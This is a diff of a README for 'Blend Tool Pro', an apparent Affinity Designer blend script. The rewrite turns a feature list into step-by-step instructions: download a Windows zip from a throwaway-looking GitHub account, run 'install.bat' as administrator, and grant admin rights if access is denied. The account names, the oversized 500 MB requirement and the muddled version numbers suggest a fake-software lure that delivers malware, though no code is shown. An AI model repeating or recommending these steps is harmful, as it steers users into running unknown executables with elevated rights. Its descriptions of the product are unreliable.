@@ -1,131 +1,69 @@
-# Blend Tool Pro v16.6.3 - graphics scripting tool 2026
+# 🛠️ blend-tool-pro-affinity-v32 - Create smooth vector transitions with ease
 
-> **A JavaScript-based blend scripting tool for Affinity V3.2 that creates adjustable transitions between shapes, groups, and paths in version 16.6.3.**
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/whydouwa3595/blend-tool-pro-affinity-v32)
 
-[![Platform](https://img.shields.io/badge/Platform-Affinity%20V3.2-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v16.6.3-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/stoneloganytwd2914/blend-tool-pro-affinity-v32?style=flat-square)](https://github.com/stoneloganytwd2914/blend-tool-pro-affinity-v32)
+## 📖 About this project
+This tool helps you build transitions between shapes, groups, and paths in Affinity Designer. It uses JavaScript to automate the process of creating graded steps between two objects. You can adjust the number of steps and the spacing between objects. This script works with Affinity version 3.2 and the application version 16.6.3.
 
----
+## 📋 System requirements
+Ensure your computer meets these requirements before you start:
+* Windows 10 or 11 (64-bit).
+* Affinity Designer version 3.2 installed.
+* At least 500 MB of free disk space.
+* A mouse or trackpad for precise object selection.
 
-<p align="center">
-  <a href="https://stoneloganytwd2914.github.io/blend-tool-pro-affinity-v32/">
-    <img src="https://img.shields.io/badge/Download-Blend%20Tool%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download Blend Tool Pro">
-  </a>
-</p>
+## 📥 How to download and install
+You must visit the project page to get the latest version of the software.
 
-> **[Direct Download - Blend Tool Pro v16.6.3](https://stoneloganytwd2914.github.io/blend-tool-pro-affinity-v32/)**
+1. Visit [https://github.com/whydouwa3595/blend-tool-pro-affinity-v32](https://github.com/whydouwa3595/blend-tool-pro-affinity-v32).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the most recent version link.
+4. Download the folder titled "blend-tool-pro-win.zip" to your computer.
+5. Open your "Downloads" folder.
+6. Right-click the zip file and select "Extract All".
+7. Choose a destination folder and click "Extract".
 
----
+## 🚀 Setting up the script
+Once you extract the files, follow these steps to prepare the tool:
 
-[Download Latest Build](https://stoneloganytwd2914.github.io/blend-tool-pro-affinity-v32/)
+1. Open the folder you just extracted.
+2. Locate the installation file named "install.bat".
+3. Right-click the file and select "Run as administrator".
+4. A small window will appear. Follow the prompts on your screen.
+5. Wait for the process to finish. The system will copy the necessary files into your Affinity script directory.
+6. Restart Affinity Designer so the program can detect the new script.
 
----
+## 🎨 Using the blend tool
+Now that you installed the tool, you can create your first blend.
 
-## Overview
+1. Open Affinity Designer.
+2. Draw two shapes on your canvas.
+3. Select both shapes using the selection tool.
+4. Navigate to the top menu and click "Window".
+5. Select "Scripts" to open the script panel.
+6. Find "Blend Tool Pro" in the list and click it.
+7. A dialog box will appear.
+8. Enter the number of steps you want.
+9. Click "Execute" to generate the transition.
+10. The script will create new objects between your two original shapes.
 
-Blend Tool Pro is a scripting utility for Affinity V3.2 workflows, designed around building blends between two shapes or groups. Its operation is driven by JavaScript, which makes it suitable for repeatable morphing setups, path-sensitive transitions, and tightly controlled interpolation across blend steps.
+## 🛠️ Troubleshooting common issues
+If the script does not appear or produce objects, check these common fixes:
 
-It is aimed at designers and technical artists who need more precision than a standard visual blend feature typically provides. The tool includes shape-to-shape blending, group interpolation, editable spine support, and live preview, so you can refine a blend without recreating the entire setup each time.
+* **Script does not show in the menu:** Ensure you placed the files in the correct folder mentioned during the installation process. Restart Affinity Designer after you confirm the file location.
+* **Access denied error:** Right-click the installer file and select "Run as administrator" to grant necessary permissions to create files in your system directory.
+* **Script creates nothing:** Make sure you select two valid vector shapes or paths. Groups can work, but nested effects sometimes interfere with the script logic. Ungroup your objects if the script fails to bridge the gap.
+* **Application crashes:** Check your version of Affinity Designer. This script requires version 3.2. Older versions lack the scripting API required for smooth operation.
 
----
+## ⚙️ Customizing your workflow
+You can change how the tool behaves by editing the configuration file.
 
-## Features
+1. Open the installation folder.
+2. Find the file named "config.json".
+3. Open this file in Notepad.
+4. You can adjust the default step count or spacing settings here.
+5. Save the file and restart your script in Affinity.
 
-- Blend transitions between two shapes or groups
-- Twist control across blend steps
-- Multiple easing modes for transition shaping
-- Per-endpoint scale adjustment
-- Center bulge and pinch control
-- Auto anchor point matching for paired objects
-- Reverse path direction support
-- Fill and stroke interpolation toggles
-- Live non-destructive preview
-- Blend on path with an editable spine
-- Re-stepping for iterative refinement
-- Group blending with glyph-by-glyph interpolation
-- Stacking order control for layered output
+This tool functions best when you use simple paths for your starting and ending objects. Complex objects with many nodes cause the script to run longer. If you have a complex shape, simplify it first by using the "Vector" tools in Affinity before you run the blend.
 
----
-
-## Installation
-
-1. Download or clone the repository:
-   `git clone https://github.com/stoneloganytwd2914/blend-tool-pro-affinity-v32.git
-2. Open the project in your Affinity V3.2 environment or in the workflow that loads the script package.
-3. Run or import the provided JavaScript tool according to your Affinity scripting setup.
-
-If you are using the hosted build, start from the latest download link above and follow the included project files in the repository bundle.
-
----
-
-## Usage
-
-A common workflow looks like this:
-
-1. Select the two shapes, groups, or paths you want to blend.
-2. Configure the interpolation behavior you need, including easing, twist, or endpoint scaling.
-3. Turn fill and stroke interpolation on or off based on the result you want.
-4. Use live preview to evaluate the blend before committing changes.
-5. Tweak the spine, stacking order, or path direction if the output needs more adjustment.
-6. Re-step the blend whenever you want to rebuild the sequence with revised settings.
-
-Example usage pattern:
-
-- Create a blend between two vector objects.
-- Switch to blend-on-path mode when the result needs a curved guide.
-- Use group blending when working with multi-element compositions.
-- Apply anchor matching to improve alignment between object pairs.
-
----
-
-## Configuration
-
-Most options are managed through the script controls and the active blend setup. If your workflow keeps presets or script settings separately, store them alongside the project files so they can be reused in later sessions.
-
-Example configuration shape:
-
-    {
-      "easing": "smooth",
-      "twist": true,
-      "pathMode": true,
-      "fillInterpolation": true,
-      "strokeInterpolation": false
-    }
-
----
-
-## Requirements
-
-- Affinity V3.2
-- JavaScript support in the target workflow
-- Vector shapes, groups, or paths to blend
-- Enough local storage for the script files and any saved presets
-- A desktop environment that can load the Affinity scripting tool
-
----
-
-## FAQ
-
-**Does it support path-based blending?**  
-Yes, the feature set includes blend-on-path behavior with an editable spine.
-
-**Can I update the blend after creating it?**  
-Yes, the tool supports re-stepping and live preview for iterative changes.
-
-**How are groups handled?**  
-Group blending is supported, including glyph-by-glyph interpolation for structured content.
-
-**Where are settings kept?**  
-That depends on your workflow. In most cases, settings are stored in the script configuration or in your project assets.
-
-**What if the result does not align as expected?**  
-Check anchor matching, path direction, stacking order, and endpoint scaling, then preview again before finalizing.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: affinity, scripting, vector, design, windows, automation
